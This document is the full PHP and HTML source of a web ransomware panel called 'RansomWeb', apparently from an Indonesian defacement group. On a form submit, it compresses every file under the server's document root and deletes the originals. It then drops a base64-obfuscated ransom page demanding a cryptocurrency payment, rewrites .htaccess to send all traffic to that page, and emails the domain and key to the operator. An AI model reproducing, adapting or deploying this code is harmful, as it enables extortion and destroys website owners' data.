<!DOCTYPE html>
<html>

<head>
<link rel="icon" type="image/gif" href="https://raw.githubusercontent.com/otakdark/otakdark/main/c0fe57565e30de034a8f52da8f7842d1.jpg">
<meta name="theme-color" content="#1A1C1F">
<title>RansomWeb</title>
<style type="text/css">
body {
    background: #1A1C1F;
    color: #e2e2e2;
}
.inpute{
    border:1px solid grey;
    background-color: transparent;
    color: white;
    width: 200px;
    height: 20px;
    text-align: center;
}
.selecte{
    border-style: dotted;
    border-color: white;
    background-color: transparent;
    width: 90px;
    color: white;
}
.submite{
    background-color: black;
	color: white;
	border: 1.2px dotten white;
	width: 100px;
}
.result{
    text-align: left;
}
</style>
<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
</head>

<body>
<center>
<pre>
<center><h1>
<font color="#56F307">
<p>Encrypt<br>
[ ./Laskar ID | REPOFDDOS ]</p>
<font color="white">Mail Function: </font><?php if(mail('example@gmail.com','#','#')) { echo "<font color='grey'>ON</font>"; } else { echo "<font color='red'>OFF</font>"; } ?>
</font></pre>
<div class="result">

<?php
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
if(isset($_POST['pass'])) {
function encfile($filename){
	if (strpos($filename, '.ransomweb') !== false) {
    return;
	}
	file_put_contents($filename.".ransomweb", gzdeflate(file_get_contents($filename), 9));
	unlink($filename);
$file = base64_decode("PD9waHAKZXJyb3JfcmVwb3J0aW5nKDApOwokaW5wdXQgPSAkX1BPU1RbJ3Bhc3MnXTsKJHBhc3MgPSAia250bCI7CmlmKGlzc2V0KCRpbnB1dCkpIHsKaWYobWQ1KCRpbnB1dCkgPT0gJHBhc3MpIHsKZnVuY3Rpb24gZGVjZmlsZSgkZmlsZW5hbWUpewoJaWYgKHN0cnBvcygkZmlsZW5hbWUsICcucmFuc29td2ViJykgPT09IEZBTFNFKSB7CglyZXR1cm47Cgl9CgkkZGVjcnlwdGVkID0gZ3ppbmZsYXRlKGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlbmFtZSkpOwoJZmlsZV9wdXRfY29udGVudHMoc3RyX3JlcGxhY2UoJy5yYW5zb213ZWInLCAnJywgJGZpbGVuYW1lKSwgJGRlY3J5cHRlZCk7CnVubGluaygnd2FyZS5waHAnKTsKCXVubGluaygkZmlsZW5hbWUpOwoJZWNobyAnPHRpdGxlPlJhbnNvbVdlYjwvdGl0bGU+PGJvZHkgYmdjb2xvcj0jMUExQzFGPjxpIGNsYXNzPSJmYSBmYS11bmxvY2siIGFyaWEtaGlkZGVuPSJ0cnVlIj48L2k+IDxmb250IGNvbG9yPSIjRkZFQjNCIj5VbmxvY2s8L2ZvbnQ+ICg8Zm9udCBjb2xvcj0iIzQwQ0UwOCI+U3VjY2VzczwvZm9udD4pIDxmb250IGNvbG9yPSIjMDBGRkZGIj49PjwvZm9udD4gPGZvbnQgY29sb3I9IiMyMTk2RjMiPicuJGZpbGVuYW1lLic8L2ZvbnQ+IDxicj4nOwp9CgpmdW5jdGlvbiBkZWNkaXIoJGRpcil7CgkkZmlsZXMgPSBhcnJheV9kaWZmKHNjYW5kaXIoJGRpciksIGFycmF5KCcuJywgJy4uJykpOwoJCWZvcmVhY2goJGZpbGVzIGFzICRmaWxlKSB7CgkJCWlmKGlzX2RpcigkZGlyLiIvIi4kZmlsZSkpewoJCQkJZGVjZGlyKCRkaXIuIi8iLiRmaWxlKTsKCQkJfWVsc2UgewoJCQkJZGVjZmlsZSgkZGlyLiIvIi4kZmlsZSk7CgkJfQoJfQp9CgpkZWNkaXIoJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXSk7CmVjaG8gJzxmb250IGNvbG9yPSJsaW1lIj48YnI+RGVjcnlwdGVkPGJyPic7CnVubGluaygkX1NFUlZFUlsnUEhQX1NFTEYnXSk7CmVjaG8gJzxmb250IGNvbG9yPSJsaW1lIj5zdWNlc3MgISEhJzsKfSBlbHNlIHsKZWNobyAnPHRpdGxlPiNSYW5zb21XZWIgfCAjUmFuc29tV2FyZTwvdGl0bGU+CjxtZXRhIG5hbWU9InRoZW1lLWNvbG9yIiBjb250ZW50PSIjY2MxMDE3Ij4KPGJvZHkgYmdjb2xvcj0jMUExQzFGPgo8cHJlPgo8Y2VudGVyPjxoMT4KPGZvbnQgY29sb3I9IiM1NkYzMDciPgojUmFuc29tV2ViCjwvZm9udD48YnI+CjxpPjxmb250IGNvbG9yPSJyZWQiIHNpemU9IjIwIj5Xcm9uZyBQYXNzd29yZCAhISE8L2ZvbnQ+PC9pPgo8L3ByZT4nOwp9CmV4aXQoKTsKfQo/Pgo8IS0tLS0tLS0tLS0tLSBDb2RlIEJ5IC4vTGFza2FyIElEIHwgUmFuc29tV2ViIC0tLS0tLS0tPiAKPGh0bWw+Cgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9d2luZG93cy0xMjUyIj4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1MYW5ndWFnZSIgY29udGVudD0iZW4tdXMiPgo8bWV0YSBuYW1lPSJkZXNjcmlwdGlvbiIgY29udGVudD0iI1JhbnNvbVdlYiB8ICNSYW5zb21XZWIiPgo8bWV0YSBuYW1lPSJrZXl3b3JkcyIgY29udGVudD0iTGFza2FyLCBSYW5zb213YXJlLCBSYW5zb213ZWIsIEhhY2tlZCwgTG9ja2VkLCBFbmNyeXB0ZWQsIExhbXB1bmcgTTMiPiAKPG1ldGEgbmFtZT0iYXV0aG9yIiBjb250ZW50PSJMYXNrYXIiPgo8bWV0YSBuYW1lPSJyb2JvdHMiIGNvbnRlbnQ9ImluZGV4LCBhbGwiPgo8bGluayBocmVmPSdodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2Nzcz9mYW1pbHk9SWNlbGFuZCcgcmVsPSdzdHlsZXNoZWV0JyB0eXBlPSd0ZXh0L2Nzcyc+CjxsaW5rIGhyZWY9J2h0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1NZXJpZW5kYScgcmVsPSdzdHlsZXNoZWV0JyB0eXBlPSd0ZXh0L2Nzcyc+CjxsaW5rIGhyZWY9J2h0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1VYnVudHUnIHJlbD0nc3R5bGVzaGVldCcgdHlwZT0ndGV4dC9jc3MnPgo8bGluayBocmVmPSdodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2Nzcz9mYW1pbHk9U2hhZG93cytJbnRvK0xpZ2h0JyByZWw9J3N0eWxlc2hlZXQnIHR5cGU9J3RleHQvY3NzJz4KPGxpbmsgcmVsPSJpY29uIiB0eXBlPSJpbWFnZS9wbmciIGhyZWY9Imh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9vdGFrZGFyay9vdGFrZGFyay9tYWluL2MwZmU1NzU2NWUzMGRlMDM0YThmNTJkYThmNzg0MmQxLmpwZyIvPgo8bGluayByZWw9InN0eWxlc2hlZXQiIHR5cGU9InRleHQvY3NzIiBocmVmPSJodHRwczovL21heGNkbi5ib290c3RyYXBjZG4uY29tL2ZvbnQtYXdlc29tZS80LjYuMy9jc3MvZm9udC1hd2Vzb21lLm1pbi5jc3MiPgo8bWV0YSBwcm9wZXJ0eT0ib2c6aW1hZ2UiIGNvbnRlbnQ9IiI+CjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBzcmM9Imh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9TYk40VVRRWCI+PC9zY3JpcHQ+CjxtZXRhIG5hbWU9J3RoZW1lLWNvbG9yJyBjb250ZW50PScjMDAwMDAwJz4KPHRpdGxlPlJhbnNvbVdlYjwvdGl0bGU+CjwvaGVhZD4KCjxzdHlsZT4KYm9keSB7CiAgIGJhY2tncm91bmQ6ICMwOTE0MEU7CiAgIGJhY2tncm91bmQtaW1hZ2U6dXJsKCk7CiAgIGJhY2tncm91bmQtc2l6ZTpjb3ZlcjsKfQp7Ci13ZWJraXQtYmFja2dyb3VuZC1zaXplOiAxMDAlIDEwMCU7CiAgIC1tb3otYmFja2dyb3VuZC1zaXplOiAxMDAlIDEwMCU7CiAgIC1vLWJhY2tncm91bmQtc2l6ZTogMTAwJSAxMDAlOwogICBiYWNrZ3JvdW5kLXNpemU6IDEwMCUgMTAwJTsKfQoubXR7CiAgICBib3JkZXI6MS4ycHggc29saWQgd2hpdGU7CiAgICBiYWNrZ3JvdW5kLWNvbG9yOiBibGFjazsKICAgIGNvbG9yOiBsaW1lOwogICAgd2lkdGg6IDIwMHB4OwogICAgaGVpZ2h0OiAyNXB4OwogICAgZm9udC1mYW1pbHk6IFVidW50dTsKICAgIHRleHQtYWxpZ246IGNlbnRlcjsKfQouYnRjYWRkcmVzc3sKICAgIGJvcmRlcjowLjhweCBzb2xpZCBncmV5OwogICAgYmFja2dyb3VuZC1jb2xvcjogIzFBMUMxRjsKICAgIGNvbG9yOiB3aGl0ZTsKICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgIHdpZHRoOiA0MDBweDsKICAgIGhlaWdodDogMjZweDsKICAgIGZvbnQtc2l6ZTogMTc7CiAgICBmb250LWZhbWlseTogVWJ1bnR1Owp9Ci5lbWFpbHsKICAgIGJvcmRlcjowcHg7CiAgICBiYWNrZ3JvdW5kLWNvbG9yOiB0cmFuc3BhcmVudDsKICAgIHRleHQtYWxpZ246IGNlbnRlcjsgCiAgICBjb2xvcjogd2hpdGU7CiAgICB3aWR0aDogMzEwcHg7CiAgICBoZWlnaHQ6IDMwcHg7CiAgICBmb250LXNpemU6IDI4LjU7CiAgICBmb250LWZhbWlseTogSWNlbGFuZDsKfQpwbGFjZWhvbGRlcnsKCWNvbG9yOiB3aGl0ZTsKfQouZ2FzewoJYmFja2dyb3VuZC1jb2xvcjogYmxhY2s7Cgljb2xvcjogd2hpdGU7Cglib3JkZXI6IDEuMnB4IHNvbGlkIHdoaXRlOwoJd2lkdGg6IDcwcHg7Cn0KPC9zdHlsZT4KCjxjZW50ZXI+PGJyPjxicj48YnI+PGJyPjxmb250Pgo8c3BhbiBzdHlsZT0iZm9udDogNDBweCBNZXJpZW5kYTtjb2xvcjp3aGl0ZTsiPllvdXIgV2Vic2l0ZSBIYXMgYmVlbiBFbmNyeXB0CjxociB3aWR0aD0iOTAlIj48c3BhbiBzdHlsZT0nZm9udDogMTBweCBpY2VsYW5kO2NvbG9yOndoaXRlO3RleHQtc2hhZG93OiAwcHggMHB4IDFweDsnPnwgUGF5bWVudCBBZGRyZXNzIHw8YnI+PGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJidGNhZGRyZXNzIiB2YWx1ZT0icGF5bWVudHoiIHJlYWRvbmx5Pjxicj4KPHNwYW4gc3R5bGU9J2ZvbnQ6IDI1cHggaWNlbGFuZDtjb2xvcjpncmV5O3RleHQtc2hhZG93OiAwcHggMHB4IDNweDsnPk1ha2UgYSBwYXltZW50IG9yIEkgZGVzdHJveSB5b3VyIHdlYnNpdGUgYW5kIGl0IHdpbGwgbm90IHJldHVybiB0byBub3JtYWwsIGJ5IG1ha2luZyBhIHBheW1lbnQgSSB3aWxsIGdpdmUgeW91IGEgcGFzc3dvcmQgYW5kIHlvdXIgd2Vic2l0ZSB3aWxsIHJldHVybiB0byBub3JtYWwgOikKPGJyPjxicj4KCTxzcGFuIHN0eWxlPSdmb250OiA5cHggaWNlbGFuZDtjb2xvcjp3aGl0ZTt0ZXh0LXNoYWRvdzogMHB4IDBweCAxcHg7Jz58fiBQYXNzd29yZCB+fAo8Zm9ybSBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBtZXRob2Q9InBvc3QiPgo8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0icGFzcyIgY2xhc3M9Im10IiBwbGFjZWhvbGRlcj0iRW50ZXIgeW91ciBkZWNyeXB0aW9uIGtleSI+CjxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJnYXMiIHZhbHVlPSJEZWNyeXB0Ij4KPC9mb3JtPgo8YnI+PGJyPgo8Ym9keSBiZ2NvbG9yPWJsYWNrPjx0ZCBhbGlnbj1jZW50ZXI+CjxzcGFuIHN0eWxlPSJmb250OiAxM3B4IHVidW50dTtjb2xvcjp3aGl0ZTsiPlsgQ29kZSBieSAuL0xhc2thciBdCjxociB3aWR0aD0iNzAlIiBjb2xvcj0iZ3JleSI+Cgk8c3BhbiBzdHlsZT0nZm9udDogOC41cHggSWNlbGFuZDtjb2xvcjp3aGl0ZTt0ZXh0LXNoYWRvdzogMHB4IDBweCAycHg7Jz58fiBDb250YWN0IE1lIH58Cjxicj48aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9ImVtYWlsIiB2YWx1ZT0iTUFJTCIgcmVhZG9ubHk+CjwvaHRtbD4=");
$q = str_replace('kntl', md5($_POST['pass']), $file);
$w = str_replace('MAIL', $_POST['email'], $q);
$e = str_replace('paymentz', $_POST['btc'], $w);
$r = str_replace('$3', '$'.$_POST['price'], $e);
$dec = $r;
$comp = "<?php eval('?>'.base64_decode("."'".base64_encode($dec)."'".").'<?php '); ?>";
$cok = fopen('ware.php', 'w');
fwrite($cok, $comp);
fclose($cok);
$hta = "#RansomWeb\n
DirectoryIndex ware.php\n
ErrorDocument 403 /ware.php\n
ErrorDocument 404 /ware.php\n
ErrorDocument 500 /ware.php\n";
$ht = fopen('.htaccess', 'w');
fwrite($ht, $hta);
fclose($ht);
echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#FF0000">Locked</font> (<font color="#40CE08">Success</font>) <font color="#00FFFF">=></font> <font color="#2196F3">'.$filename.'</font> <br>';
}

function encdir($dir){
	$files = array_diff(scandir($dir), array('.', '..'));
		foreach($files as $file) {
			if(is_dir($dir."/".$file)){
				encdir($dir."/".$file);
			} else {
				encfile($dir."/".$file);
				
		}
	}
}

if(isset($_POST['pass'])){
	encdir($_SERVER['DOCUMENT_ROOT']);
}
copy('ware.php', $_SERVER['DOCUMENT_ROOT'].'/ware.php');
$memec = $_POST['email'];
$cyna = 'RansomWeb | Laskar Ransomware Info';
$ngentot = "Domain : ".$_SERVER['SERVER_NAME'];
$skuy = "Password : ".$_POST['pass'];
$zegarr = "$ngentot \n $skuy";
if(mail($memec,$cyna,$zegarr)) {
echo '<font color="lime"><b>Password Saved, Check your Email</b></font>';
} else {
echo '<font color="red"><b>No Mail</b></font>';
}
exit();
}
?>

<pre>
<h2><center><font color=white>Encryption Key [~'-']~</h2></font></pre></center>
<form action="kntl" method="post" style=" text-align: center;">
<font color="grey">
<label>Key : </label>
<input type="text" name="pass" class="inpute" placeholder="make a password">
<select name="method" class="selecte">
<option value="kntl">Encrypt</option>
</select><pre><br>
<label>Your Email : </label>
<input type="text" name="email" class="inpute">
<label>Your Payment Address : </label>
<input type="text" name="btc" class="inpute">
<br>
<input type="submit" name="submit" class="submite" value="Submit" />
</form>
</div>
</body>

</html>
